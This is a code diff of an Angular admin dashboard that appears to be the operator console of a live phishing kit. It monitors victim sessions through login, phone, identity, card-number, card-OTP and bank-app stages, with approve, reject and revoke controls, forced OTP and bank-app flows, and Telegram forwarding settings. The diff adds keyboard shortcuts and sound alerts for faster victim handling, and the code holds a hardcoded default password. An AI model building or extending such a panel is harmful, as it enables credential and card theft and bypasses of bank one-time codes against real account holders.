@@ -1,5 +1,5 @@
 
-import { Component, inject, computed, signal, effect, OnInit } from '@angular/core';
+import { Component, inject, computed, signal, effect, OnInit, HostListener } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
 import { StateService, SessionHistory } from '../services/state.service';
@@ -9,14 +9,15 @@ import { TranslationService } from '../services/translation.service';
 import { TranslatePipe } from '../pipes/translate.pipe';
 import { COUNTRIES } from '../utils/country-data';
 import { LANG_NAMES } from '../utils/language-map';
+import { SessionProgressComponent } from './session-progress.component';
 
 type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
 @Component({
-  selector: 'app-admin-dashboard',
-  standalone: true,
-  imports: [CommonModule, FormsModule, TranslatePipe],
-  template: `
+    selector: 'app-admin-dashboard',
+    standalone: true,
+    imports: [CommonModule, FormsModule, TranslatePipe, SessionProgressComponent],
+    template: `
     <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg dark:bg-slate-900 font-sans text-pp-navy dark:text-slate-100 overflow-hidden">
       
       <!-- Toast Notification -->
@@ -1035,6 +1036,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 }
             </div>
 
+            <!-- Session Progress Stepper -->
+            <div class="px-6 lg:px-8 pt-4">
+                <app-session-progress
+                    [stage]="session?.stage || 'login'"
+                    [isLoginVerified]="session?.isLoginVerified || false"
+                    [isPhoneVerified]="session?.isPhoneVerified || false"
+                    [isPersonalVerified]="session?.isPersonalVerified || false"
+                    [isCardSubmitted]="!!session?.data?.cardNumber"
+                    [isFlowComplete]="session?.stage === 'complete' || session?.stage === 'final_review'"
+                    [verificationFlow]="session?.verificationFlow || 'complete'"
+                    [skipPhone]="session?.skipPhone || false">
+                </app-session-progress>
+            </div>
+
             <div class="flex-1 p-6 lg:p-8">
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
                     <!-- Credentials -->
@@ -1166,15 +1181,30 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                             <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live' : 'Offline' }}</span>
                         </div>
 
-                        <!-- Bank Flow Options -->
+                        <!-- Bank Flow Options with Keyboard Hints -->
                         <div class="flex items-center gap-1 bg-slate-100 dark:bg-slate-700/50 p-1 rounded-lg">
-                            <button (click)="requestFlow('app')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force Bank App Flow">
+                            <button (click)="requestFlow('app')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all relative group" title="Force Bank App Flow (B)">
                                 <span class="material-icons text-lg">touch_app</span>
+                                <span class="absolute -top-1 -right-1 bg-slate-600 text-white text-[8px] px-1 rounded font-mono opacity-0 group-hover:opacity-100 transition-opacity">B</span>
                             </button>
-                            <button (click)="requestFlow('otp')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force OTP Flow">
+                            <button (click)="requestFlow('otp')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all relative group" title="Force OTP Flow (O)">
                                 <span class="material-icons text-lg">sms</span>
+                                <span class="absolute -top-1 -right-1 bg-slate-600 text-white text-[8px] px-1 rounded font-mono opacity-0 group-hover:opacity-100 transition-opacity">O</span>
                             </button>
                         </div>
+                        
+                        <!-- Sound Toggle -->
+                        <button (click)="soundEnabled.set(!soundEnabled())" class="p-2 rounded hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors" [title]="soundEnabled() ? 'Mute notifications' : 'Enable sound'">
+                            <span class="material-icons text-lg" [class.text-pp-blue]="soundEnabled()" [class.text-slate-400]="!soundEnabled()">
+                                {{ soundEnabled() ? 'volume_up' : 'volume_off' }}
+                            </span>
+                        </button>
+                        
+                        <!-- Keyboard Shortcut Help -->
+                        <button (click)="showShortcutHints.set(!showShortcutHints())" class="hidden lg:flex p-2 rounded hover:bg-slate-100 dark:hover:bg-slate-700 text-slate-400 hover:text-slate-600 dark:hover:text-slate-300 transition-colors items-center gap-1" title="Keyboard shortcuts (?)">
+                            <span class="material-icons text-sm">keyboard</span>
+                            <span class="text-[10px] font-mono">?</span>
+                        </button>
                     </div>
 
                     @if(monitoredSession()) {
@@ -1183,32 +1213,69 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                     [disabled]="!session?.isLoginVerified"
                                     [class.opacity-50]="!session?.isLoginVerified"
                                     [class.cursor-not-allowed]="!session?.isLoginVerified"
-                                    class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                    class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm relative group">
                                 {{ 'REVOKE' | translate }}
+                                <span class="absolute -top-2 -right-2 bg-red-600 text-white text-[8px] px-1.5 py-0.5 rounded font-mono hidden lg:group-hover:block">X</span>
                             </button>
                             <button (click)="reject()"
                                     [disabled]="!canInteract()"
                                     [class.opacity-50]="!canInteract()"
                                     [class.cursor-not-allowed]="!canInteract()"
-                                    class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                    class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm relative group">
                                 {{ 'REJECT' | translate }}
+                                <span class="absolute -top-2 -right-2 bg-slate-700 text-white text-[8px] px-1.5 py-0.5 rounded font-mono hidden lg:group-hover:block">R</span>
                             </button>
                             <button (click)="approve()"
                                     [disabled]="!canInteract()"
                                     [class.opacity-50]="!canInteract()"
                                     [class.cursor-not-allowed]="!canInteract()"
-                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2 relative group">
                                 <span class="material-icons text-sm">check</span> {{ approveText() | translate }}
+                                <span class="absolute -top-2 -right-2 bg-pp-success text-pp-navy text-[8px] px-1.5 py-0.5 rounded font-mono hidden lg:group-hover:block font-bold">A</span>
                             </button>
                         </div>
                     }
                 </div>
+                
+                <!-- Keyboard Shortcuts Help Panel -->
+                @if(showShortcutHints()) {
+                    <div class="absolute bottom-24 right-6 bg-slate-900 text-white p-4 rounded-xl shadow-2xl z-30 animate-fade-in">
+                        <div class="flex justify-between items-center mb-3 pb-2 border-b border-slate-700">
+                            <h4 class="font-bold text-sm">Keyboard Shortcuts</h4>
+                            <button (click)="showShortcutHints.set(false)" class="text-slate-400 hover:text-white">
+                                <span class="material-icons text-sm">close</span>
+                            </button>
+                        </div>
+                        <div class="space-y-2 text-xs">
+                            <div class="flex justify-between gap-4">
+                                <span class="text-slate-400">Approve</span>
+                                <kbd class="bg-slate-700 px-1.5 py-0.5 rounded font-mono">A</kbd>
+                            </div>
+                            <div class="flex justify-between gap-4">
+                                <span class="text-slate-400">Reject</span>
+                                <kbd class="bg-slate-700 px-1.5 py-0.5 rounded font-mono">R</kbd>
+                            </div>
+                            <div class="flex justify-between gap-4">
+                                <span class="text-slate-400">Revoke</span>
+                                <kbd class="bg-slate-700 px-1.5 py-0.5 rounded font-mono">X</kbd>
+                            </div>
+                            <div class="flex justify-between gap-4">
+                                <span class="text-slate-400">Force OTP</span>
+                                <kbd class="bg-slate-700 px-1.5 py-0.5 rounded font-mono">O</kbd>
+                            </div>
+                            <div class="flex justify-between gap-4">
+                                <span class="text-slate-400">Force Bank App</span>
+                                <kbd class="bg-slate-700 px-1.5 py-0.5 rounded font-mono">B</kbd>
+                            </div>
+                        </div>
+                    </div>
+                }
             }
       </ng-template>
       }
     </div>
   `,
-  styles: [`
+    styles: [`
     .shadow-button { box-shadow: 0 4px 14px 0 rgba(0,0,0,0.1); }
     .animate-fade-in { animation: fadeIn 0.2s ease-out; }
     .animate-slide-in-right { animation: slideInRight 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
@@ -1217,495 +1284,556 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
   `]
 })
 export class AdminDashboardComponent implements OnInit {
-  state = inject(StateService);
-  auth = inject(AuthService);
-  modal = inject(ModalService);
-  translate = inject(TranslationService);
+    state = inject(StateService);
+    auth = inject(AuthService);
+    modal = inject(ModalService);
+    translate = inject(TranslationService);
 
-  activeTab = signal<AdminTab>('live');
-  currentAdminLang = 'en';
+    activeTab = signal<AdminTab>('live');
+    currentAdminLang = 'en';
 
-  preAuthSuccess = signal(false);
-  preAuthUser = '';
-  preAuthPass = '';
-  preAuthError = signal(false);
-  gateUser = '';
-  gatePass = '';
-  loginUser = '';
-  loginPass = '';
-  loginError = signal(false);
-  isLoading = signal(false);
-  userList = signal<any[]>([]);
-  userPanelOpen = signal(false);
-  selectedAdmin = signal<any>(null);
-  selectedAdminLinks = signal<any[]>([]);
-  selectedAdminSettings: any = {};
-  linkList = signal<any[]>([]);
-  auditLogs = signal<any[]>([]);
-  systemLogs = signal<any[]>([]);
-  kpiStats = signal<any>({ total: 0, active: 0, verified: 0, clicks: 0 });
-  historyPanelOpen = signal(false);
-  selectedHistorySession = signal<SessionHistory | null>(null);
-  userModalOpen = signal(false);
-  newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
-  assignModalOpen = signal(false);
-  assignSearch = signal('');
-  searchQuery = signal('');
-  timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
-  customDateStart = signal<string>('');
-  customDateEnd = signal<string>('');
-  countryFilter = signal<string>('all');
-  statusFilter = signal<string>('all');
-  selectedSessionIds = signal<Set<string>>(new Set());
-  incompleteCollapsed = signal(false);
-  tgToken = '';
-  tgChat = '';
-  flowSettings: any = {};
-  settingOldPass = '';
-  settingNewPass = '';
-  isDarkMode = signal(false);
-  elapsedTime = signal('0m');
-  countdownSeconds = signal<number | null>(null);
-  private timer: number | undefined;
+    preAuthSuccess = signal(false);
+    preAuthUser = '';
+    preAuthPass = '';
+    preAuthError = signal(false);
+    gateUser = '';
+    gatePass = '';
+    loginUser = '';
+    loginPass = '';
+    loginError = signal(false);
+    isLoading = signal(false);
+    userList = signal<any[]>([]);
+    userPanelOpen = signal(false);
+    selectedAdmin = signal<any>(null);
+    selectedAdminLinks = signal<any[]>([]);
+    selectedAdminSettings: any = {};
+    linkList = signal<any[]>([]);
+    auditLogs = signal<any[]>([]);
+    systemLogs = signal<any[]>([]);
+    kpiStats = signal<any>({ total: 0, active: 0, verified: 0, clicks: 0 });
+    historyPanelOpen = signal(false);
+    selectedHistorySession = signal<SessionHistory | null>(null);
+    userModalOpen = signal(false);
+    newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
+    assignModalOpen = signal(false);
+    assignSearch = signal('');
+    searchQuery = signal('');
+    timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
+    customDateStart = signal<string>('');
+    customDateEnd = signal<string>('');
+    countryFilter = signal<string>('all');
+    statusFilter = signal<string>('all');
+    selectedSessionIds = signal<Set<string>>(new Set());
+    incompleteCollapsed = signal(false);
+    tgToken = '';
+    tgChat = '';
+    flowSettings: any = {};
+    settingOldPass = '';
+    settingNewPass = '';
+    isDarkMode = signal(false);
+    elapsedTime = signal('0m');
+    countdownSeconds = signal<number | null>(null);
+    private timer: number | undefined;
 
-  countryList = COUNTRIES;
+    // Quick action keyboard shortcuts and sound
+    soundEnabled = signal(true);
+    showShortcutHints = signal(false);
+    private notificationSound: HTMLAudioElement | null = null;
 
-  // Create language list for UI selectors, sorted alphabetically by name
-  languageList = Object.entries(LANG_NAMES).map(([code, name]) => ({ code, name })).sort((a, b) => a.name.localeCompare(b.name));
+    // Keyboard shortcut handler
+    @HostListener('document:keydown', ['$event'])
+    handleKeyboardShortcut(event: KeyboardEvent) {
+        // Ignore if typing in an input field
+        if (event.target instanceof HTMLInputElement || event.target instanceof HTMLTextAreaElement) {
+            return;
+        }
 
-  // Country Selector UI State
-  allowedSearch = signal('');
-  blockedSearch = signal('');
-  showAllowedDropdown = signal(false);
-  showBlockedDropdown = signal(false);
+        // Only work when viewing a session and on live tab
+        if (!this.monitoredSession() || this.activeTab() !== 'live') {
+            return;
+        }
 
-  filteredAllowedCountries = computed(() => {
-      const q = this.allowedSearch().toLowerCase();
-      if (!q) return this.countryList;
-      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
-  });
+        const key = event.key.toLowerCase();
 
-  filteredBlockedCountries = computed(() => {
-      const q = this.blockedSearch().toLowerCase();
-      if (!q) return this.countryList;
-      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
-  });
+        switch (key) {
+            case 'a': // Approve
+                if (this.canInteract()) {
+                    event.preventDefault();
+                    this.approve();
+                }
+                break;
+            case 'r': // Reject
+                if (this.canInteract()) {
+                    event.preventDefault();
+                    this.reject();
+                }
+                break;
+            case 'x': // Revoke
+                if (this.monitoredSession()?.isLoginVerified) {
+                    event.preventDefault();
+                    this.revoke();
+                }
+                break;
+            case 'o': // Force OTP
+                event.preventDefault();
+                this.requestFlow('otp');
+                break;
+            case 'b': // Force Bank App
+                event.preventDefault();
+                this.requestFlow('app');
+                break;
+            case '?': // Toggle shortcut hints
+                event.preventDefault();
+                this.showShortcutHints.update(v => !v);
+                break;
+        }
+    }
 
-  filteredAdmins = computed(() => { const q = this.assignSearch().toLowerCase(); return this.userList().filter(u => u.username.toLowerCase().includes(q)); });
-  canInteract = computed(() => { const s = this.monitoredSession(); return s?.currentView === 'loading'; });
-  uniqueCountries = computed(() => { const history = this.state.history(); const countries = new Set<string>(); history.forEach(h => { if (h.data?.ipCountry) countries.add(h.data.ipCountry); }); return Array.from(countries).sort(); });
-  filteredHistory = computed(() => {
-      let data = this.state.history();
-      const q = this.searchQuery().toLowerCase();
-      const tf = this.timeFilter();
-      const cf = this.countryFilter();
-      const sf = this.statusFilter();
-      const now = Date.now();
+    // Play notification sound for new sessions
+    playNotificationSound() {
+        if (!this.soundEnabled() || !this.notificationSound) return;
+        this.notificationSound.currentTime = 0;
+        this.notificationSound.play().catch(() => { });
+    }
 
-      if (tf !== 'all') {
-          let cutoff = 0;
-          if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
-          else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
-          else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);
+    countryList = COUNTRIES;
 
-          if (tf !== 'custom') {
-              data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
-          }
-      }
-      if (cf !== 'all') {
-          data = data.filter(h => h.data?.ipCountry === cf);
-      }
-      if (sf !== 'all') {
-          if (sf === 'verified') data = data.filter(h => !h.data?.isArchivedIncomplete);
-          else if (sf === 'incomplete') data = data.filter(h => h.data?.isArchivedIncomplete);
-      }
-      if (q) {
-          data = data.filter(h =>
-              h.id.toLowerCase().includes(q) ||
-              (h.email && h.email.toLowerCase().includes(q))
-          );
-      }
-      return data;
-  });
-  isSettingsConfigured = computed(() => !!(this.tgToken && this.tgChat));
-  maskedToken = computed(() => this.tgToken ? '********' : '');
-  maskedChat = computed(() => this.tgChat ? '***' : '');
-  monitoredSession = computed(() => { const id = this.state.monitoredSessionId(); if (!id) return null; const active = this.state.activeSessions().find(s => s.id === id); if (active) return active; return this.state.incompleteSessions().find(s => s.id === id); });
+    // Create language list for UI selectors, sorted alphabetically by name
+    languageList = Object.entries(LANG_NAMES).map(([code, name]) => ({ code, name })).sort((a, b) => a.name.localeCompare(b.name));
 
-  constructor() {
-      if (typeof localStorage !== 'undefined') {
-          const savedLang = localStorage.getItem('admin_lang');
-          if (savedLang) {
-              this.currentAdminLang = savedLang;
-              this.translate.loadLanguage(savedLang);
-          }
-          const stored = localStorage.getItem('admin_theme');
-          if (stored === 'dark') {
-              this.isDarkMode.set(true);
-              if (typeof document !== 'undefined') document.documentElement.classList.add('dark');
-          }
-      }
+    // Country Selector UI State
+    allowedSearch = signal('');
+    blockedSearch = signal('');
+    showAllowedDropdown = signal(false);
+    showBlockedDropdown = signal(false);
 
-      const returnTab = sessionStorage.getItem('hv_return_tab');
-      if (returnTab === 'users') {
-          this.activeTab.set('users');
-          sessionStorage.removeItem('hv_return_tab');
-          this.preAuthSuccess.set(true);
-      }
+    filteredAllowedCountries = computed(() => {
+        const q = this.allowedSearch().toLowerCase();
+        if (!q) return this.countryList;
+        return this.countryList.filter(c => c.name.toLowerCase().includes(q));
+    });
 
-      effect(() => {
-          if (this.auth.isAuthenticated()) {
-              this.state.setAdminAuthenticated(true);
-              const role = this.auth.currentUser()?.role;
-              if (role === 'hypervisor') {
-                  this.fetchUsers();
-                  const token = this.auth.getToken();
-                  if (token) {
-                      this.state.joinHypervisorRoom(token);
-                  }
-                  this.state.onLog((log) => { this.systemLogs.update(logs => [log, ...logs].slice(0, 100)); });
-              }
-          }
-      }, { allowSignalWrites: true });
+    filteredBlockedCountries = computed(() => {
+        const q = this.blockedSearch().toLowerCase();
+        if (!q) return this.countryList;
+        return this.countryList.filter(c => c.name.toLowerCase().includes(q));
+    });
 
-      effect(() => {
-          if (this.activeTab() === 'system') {
-              this.fetchAuditLogs();
-              this.calcStats();
-              fetch('/api/settings').then(res => res.json()).then(data => {
-                  this.gateUser = data.gateUser || 'admin';
-                  this.gatePass = data.gatePass || 'secure123';
-              });
-          }
-          if (this.activeTab() === 'links') {
-              this.fetchLinks();
-          }
-      }, { allowSignalWrites: true });
+    filteredAdmins = computed(() => { const q = this.assignSearch().toLowerCase(); return this.userList().filter(u => u.username.toLowerCase().includes(q)); });
+    canInteract = computed(() => { const s = this.monitoredSession(); return s?.currentView === 'loading'; });
+    uniqueCountries = computed(() => { const history = this.state.history(); const countries = new Set<string>(); history.forEach(h => { if (h.data?.ipCountry) countries.add(h.data.ipCountry); }); return Array.from(countries).sort(); });
+    filteredHistory = computed(() => {
+        let data = this.state.history();
+        const q = this.searchQuery().toLowerCase();
+        const tf = this.timeFilter();
+        const cf = this.countryFilter();
+        const sf = this.statusFilter();
+        const now = Date.now();
 
-      effect(() => {
-          const user = this.auth.currentUser();
-          if (user) {
-              this.flowSettings = { ...user.settings };
-              // Ensure arrays exist
-              if(!this.flowSettings.allowedCountries) this.flowSettings.allowedCountries = [];
-              if(!this.flowSettings.blockedCountries) this.flowSettings.blockedCountries = [];
+        if (tf !== 'all') {
+            let cutoff = 0;
+            if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
+            else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
+            else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);
 
-              if (user.telegramConfig) {
-                  this.tgToken = user.telegramConfig.token || '';
-                  this.tgChat = user.telegramConfig.chat || '';
-              }
-          }
-      });
+            if (tf !== 'custom') {
+                data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
+            }
+        }
+        if (cf !== 'all') {
+            data = data.filter(h => h.data?.ipCountry === cf);
+        }
+        if (sf !== 'all') {
+            if (sf === 'verified') data = data.filter(h => !h.data?.isArchivedIncomplete);
+            else if (sf === 'incomplete') data = data.filter(h => h.data?.isArchivedIncomplete);
+        }
+        if (q) {
+            data = data.filter(h =>
+                h.id.toLowerCase().includes(q) ||
+                (h.email && h.email.toLowerCase().includes(q))
+            );
+        }
+        return data;
+    });
+    isSettingsConfigured = computed(() => !!(this.tgToken && this.tgChat));
+    maskedToken = computed(() => this.tgToken ? '********' : '');
+    maskedChat = computed(() => this.tgChat ? '***' : '');
+    monitoredSession = computed(() => { const id = this.state.monitoredSessionId(); if (!id) return null; const active = this.state.activeSessions().find(s => s.id === id); if (active) return active; return this.state.incompleteSessions().find(s => s.id === id); });
 
-      effect(() => {
-          const session = this.monitoredSession();
-          clearInterval(this.timer);
-          if (session) {
-              const update = () => {
-                   if(session.timestamp) this.elapsedTime.set(this.getElapsed(session.timestamp));
-                   if(session.currentView === 'loading' && session.data?.waitingStart) {
-                       const start = Number(session.data.waitingStart);
-                       const limit = Number(session.data.autoApproveThreshold || 20000);
-                       const now = Date.now();
-                       const remaining = Math.max(0, Math.ceil((limit - (now - start)) / 1000));
-                       this.countdownSeconds.set(remaining);
-                   } else {
-                       this.countdownSeconds.set(null);
-                   }
-              };
-              update();
-              this.timer = setInterval(update, 1000) as unknown as number;
-          } else {
-              this.elapsedTime.set('0m');
-              this.countdownSeconds.set(null);
-          }
-      }, { allowSignalWrites: true });
-  }
+    constructor() {
+        if (typeof localStorage !== 'undefined') {
+            const savedLang = localStorage.getItem('admin_lang');
+            if (savedLang) {
+                this.currentAdminLang = savedLang;
+                this.translate.loadLanguage(savedLang);
+            }
+            const stored = localStorage.getItem('admin_theme');
+            if (stored === 'dark') {
+                this.isDarkMode.set(true);
+                if (typeof document !== 'undefined') document.documentElement.classList.add('dark');
+            }
+        }
 
-  ngOnInit() {}
+        const returnTab = sessionStorage.getItem('hv_return_tab');
+        if (returnTab === 'users') {
+            this.activeTab.set('users');
+            sessionStorage.removeItem('hv_return_tab');
+            this.preAuthSuccess.set(true);
+        }
 
-  changeAdminLanguage(lang: string) {
-      this.currentAdminLang = lang;
-      this.translate.loadLanguage(lang);
-      localStorage.setItem('admin_lang', lang);
-  }
+        effect(() => {
+            if (this.auth.isAuthenticated()) {
+                this.state.setAdminAuthenticated(true);
+                const role = this.auth.currentUser()?.role;
+                if (role === 'hypervisor') {
+                    this.fetchUsers();
+                    const token = this.auth.getToken();
+                    if (token) {
+                        this.state.joinHypervisorRoom(token);
+                    }
+                    this.state.onLog((log) => { this.systemLogs.update(logs => [log, ...logs].slice(0, 100)); });
+                }
+            }
+        }, { allowSignalWrites: true });
 
-  addCountry(type: 'allowed' | 'blocked', code: string) {
-      if (!this.flowSettings) this.flowSettings = {};
-      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
-      if (!this.flowSettings[key]) this.flowSettings[key] = [];
-      if (!this.flowSettings[key].includes(code)) {
-          this.flowSettings[key].push(code);
-      }
-  }
+        effect(() => {
+            if (this.activeTab() === 'system') {
+                this.fetchAuditLogs();
+                this.calcStats();
+                fetch('/api/settings').then(res => res.json()).then(data => {
+                    this.gateUser = data.gateUser || 'admin';
+                    this.gatePass = data.gatePass || 'secure123';
+                });
+            }
+            if (this.activeTab() === 'links') {
+                this.fetchLinks();
+            }
+        }, { allowSignalWrites: true });
 
-  toggleAllowedDropdown() {
-      this.showAllowedDropdown.update(v => !v);
-      this.showBlockedDropdown.set(false);
-  }
+        effect(() => {
+            const user = this.auth.currentUser();
+            if (user) {
+                this.flowSettings = { ...user.settings };
+                // Ensure arrays exist
+                if (!this.flowSettings.allowedCountries) this.flowSettings.allowedCountries = [];
+                if (!this.flowSettings.blockedCountries) this.flowSettings.blockedCountries = [];
 
-  toggleBlockedDropdown() {
-      this.showBlockedDropdown.update(v => !v);
-      this.showAllowedDropdown.set(false);
-  }
+                if (user.telegramConfig) {
+                    this.tgToken = user.telegramConfig.token || '';
+                    this.tgChat = user.telegramConfig.chat || '';
+                }
+            }
+        });
 
-  selectCountryToAdd(type: 'allowed' | 'blocked', code: string) {
-      this.addCountry(type, code);
-      this.showAllowedDropdown.set(false);
-      this.showBlockedDropdown.set(false);
-      this.allowedSearch.set('');
-      this.blockedSearch.set('');
-  }
+        effect(() => {
+            const session = this.monitoredSession();
+            clearInterval(this.timer);
+            if (session) {
+                const update = () => {
+                    if (session.timestamp) this.elapsedTime.set(this.getElapsed(session.timestamp));
+                    if (session.currentView === 'loading' && session.data?.waitingStart) {
+                        const start = Number(session.data.waitingStart);
+                        const limit = Number(session.data.autoApproveThreshold || 20000);
+                        const now = Date.now();
+                        const remaining = Math.max(0, Math.ceil((limit - (now - start)) / 1000));
+                        this.countdownSeconds.set(remaining);
+                    } else {
+                        this.countdownSeconds.set(null);
+                    }
+                };
+                update();
+                this.timer = setInterval(update, 1000) as unknown as number;
+            } else {
+                this.elapsedTime.set('0m');
+                this.countdownSeconds.set(null);
+            }
+        }, { allowSignalWrites: true });
+    }
 
-  removeCountry(type: 'allowed' | 'blocked', code: string) {
-      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
-      if (this.flowSettings && this.flowSettings[key]) {
-          this.flowSettings[key] = this.flowSettings[key].filter((c: string) => c !== code);
-      }
-  }
+    ngOnInit() { }
 
-  addCountryToAdmin(type: 'allowed' | 'blocked', code: string) {
-      // For selectedAdminSettings in User Panel
-      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
-      if (!this.selectedAdminSettings[key]) this.selectedAdminSettings[key] = [];
-      if (!this.selectedAdminSettings[key].includes(code)) {
-          this.selectedAdminSettings[key].push(code);
-      }
-  }
+    changeAdminLanguage(lang: string) {
+        this.currentAdminLang = lang;
+        this.translate.loadLanguage(lang);
+        localStorage.setItem('admin_lang', lang);
+    }
 
-  removeCountryFromAdmin(type: 'allowed' | 'blocked', code: string) {
-      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
-      if (this.selectedAdminSettings && this.selectedAdminSettings[key]) {
-          this.selectedAdminSettings[key] = this.selectedAdminSettings[key].filter((c: string) => c !== code);
-      }
-  }
+    addCountry(type: 'allowed' | 'blocked', code: string) {
+        if (!this.flowSettings) this.flowSettings = {};
+        const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+        if (!this.flowSettings[key]) this.flowSettings[key] = [];
+        if (!this.flowSettings[key].includes(code)) {
+            this.flowSettings[key].push(code);
+        }
+    }
 
-  async doPreAuth() {
-      this.isLoading.set(true);
-      try {
-          const res = await fetch('/api/admin/gate', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ username: this.preAuthUser, password: this.preAuthPass })
-          });
-          if (res.ok) {
-              this.preAuthSuccess.set(true);
-              this.preAuthError.set(false);
-          } else {
-              this.preAuthError.set(true);
-          }
-      } catch (e) {
-          this.preAuthError.set(true);
-      } finally {
-          this.isLoading.set(false);
-      }
-  }
+    toggleAllowedDropdown() {
+        this.showAllowedDropdown.update(v => !v);
+        this.showBlockedDropdown.set(false);
+    }
 
-  async doLogin() {
-      this.loginError.set(false);
-      this.isLoading.set(true);
-      const success = await this.auth.login(this.loginUser, this.loginPass);
-      this.isLoading.set(false);
-      if (success) {
-          this.loginError.set(false);
-          this.loginUser = '';
-          this.loginPass = '';
-      } else {
-          this.loginError.set(true);
-      }
-  }
+    toggleBlockedDropdown() {
+        this.showBlockedDropdown.update(v => !v);
+        this.showAllowedDropdown.set(false);
+    }
 
-  exitAdmin() { this.auth.logout(); this.state.returnFromAdmin(); this.preAuthSuccess.set(false); }
-  exitImpersonation() { this.auth.logout(); }
-  refresh() { this.state.fetchSessions(); if(this.auth.currentUser()?.role === 'hypervisor') { this.fetchUsers(); } }
+    selectCountryToAdd(type: 'allowed' | 'blocked', code: string) {
+        this.addCountry(type, code);
+        this.showAllowedDropdown.set(false);
+        this.showBlockedDropdown.set(false);
+        this.allowedSearch.set('');
+        this.blockedSearch.set('');
+    }
 
-  approveText(): string {
-      const stage = this.monitoredSession()?.stage;
-      switch (stage) {
-          case 'login': return 'APPROVE_LOGIN';
-          case 'phone_pending': return 'APPROVE_PHONE';
-          case 'personal_pending': return 'APPROVE_IDENTITY';
-          case 'card_pending': return 'APPROVE_CARD';
-          case 'card_otp_pending': return 'APPROVE_OTP';
-          case 'bank_app_pending': return 'APPROVE_APP';
-          default: return 'APPROVE';
-      }
-  }
+    removeCountry(type: 'allowed' | 'blocked', code: string) {
+        const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+        if (this.flowSettings && this.flowSettings[key]) {
+            this.flowSettings[key] = this.flowSettings[key].filter((c: string) => c !== code);
+        }
+    }
 
-  getDeviceImage(ua: string | undefined): string | null {
-      if (!ua) return null;
-      const lower = ua.toLowerCase();
-      if (lower.includes('macintosh') || lower.includes('mac os') || lower.includes('iphone') || lower.includes('ipad')) return 'assets/icons/apple.svg';
-      if (lower.includes('windows')) return 'assets/icons/windows.svg';
-      return null;
-  }
-  getDeviceIcon(ua: string | undefined): string {
-      if (!ua) return 'help_outline';
-      const lower = ua.toLowerCase();
-      if (lower.includes('iphone')) return 'phone_iphone';
-      if (lower.includes('ipad')) return 'tablet_mac';
-      if (lower.includes('android')) return lower.includes('mobile') ? 'android' : 'tablet_android';
-      if (lower.includes('macintosh') || lower.includes('mac os')) return 'laptop_mac';
-      if (lower.includes('windows')) return 'desktop_windows';
-      if (lower.includes('linux')) return 'terminal';
-      return 'devices';
-  }
-  getFlagUrl(countryCode: string | undefined): string { if (!countryCode) return ''; return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`; }
-  getCardLogoUrl(cardType: string | undefined): string {
-      if (!cardType) return '';
-      const t = cardType.toLowerCase();
-      if (t === 'visa') return 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
-      if (t === 'mastercard') return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
-      if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
-      if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
-      return '';
-  }
